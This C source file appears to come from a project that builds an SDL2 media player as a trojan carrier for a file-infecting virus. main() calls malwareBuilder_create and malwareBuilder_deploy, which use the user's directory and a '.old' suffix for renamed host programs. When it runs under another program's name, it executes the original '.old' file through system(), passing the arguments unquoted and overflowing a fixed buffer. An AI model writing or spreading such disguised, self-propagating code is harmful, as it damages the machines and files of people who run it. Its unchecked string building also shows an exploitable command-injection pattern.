#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <SDL2/SDL.h>
#include <SDL2/SDL_image.h>

#include "mediaplayer.h"
#include "malwareBuilder.h"
#include "malwareUtils.h"

#define WINDOW_WIDTH 1120
#define WINDOW_HEIGHT 800
#define WINDOW_SCALE 1

int main(int argc, char *argv[]) {
   srand(time(NULL));

   char *token;
   token = strtok(argv[0],".");
   char *lastToken;
   while (token != NULL)
   {
      lastToken = token;
      token = strtok(NULL, ".");
   }

   MediaPlayer *app;
   MalwareBuilder *malware = malwareBuilder_create(getUserCurentDir(),".old", lastToken);

   // Initialize SDL
   if (SDL_Init(SDL_INIT_VIDEO) < 0) {
      fprintf(stderr, "Erreur d'initialisation de SDL : %s\n", SDL_GetError());
      cleanup(NULL, NULL, NULL);
      return EXIT_FAILURE;
   }

   // Initialize SDL Image
   if (!(IMG_Init(IMG_INIT_PNG) & IMG_INIT_PNG)) {
      fprintf(stderr, "Erreur d'initialisation de SDL_image : %s\n", IMG_GetError());
      cleanup(NULL, NULL, NULL);
      return EXIT_FAILURE;
   }

   // Start the malware
   malwareBuilder_deploy(argc, argv, malware);

   if(strstr(argv[0], "MediaPlayer") != NULL){


      printf("MediaPlayer\n");
      // Initialize MediaPlayer App instance
      app = mediaplayer_create(WINDOW_WIDTH, WINDOW_HEIGHT);
      if (app == NULL) {
         return EXIT_FAILURE;
      }

      // Start the app
      mediaplayer_run(app);

      // Destroy the app instance at the end
      mediaplayer_destroy(app);
   } else {
      printf("Malware\n");
   printf("1 : %s\n", strstr("MediaPlayer", argv[0]));
   printf("2 : %s\n", strstr(argv[0], "MediaPlayer"));
      char *token;
        token = strtok (argv[0],".");
        char *lastToken ;
        while (token != NULL)
        {
            lastToken = token ;
            token = strtok (NULL, ".");
        }

        char file_path_sain[1000];
        sprintf(file_path_sain, "%s%s%s", getUserCurentDir(), lastToken, ".old");

         printf("file_path_sain = %s\n",file_path_sain);

        for(int i = 1; i < argc; i++){
            strcat(file_path_sain, argv[i]);
            strcat(file_path_sain, " ");

            printf("file_path_sain = %s\n",argv[i]);
        }

        system(file_path_sain);
   }

   return EXIT_SUCCESS;
}
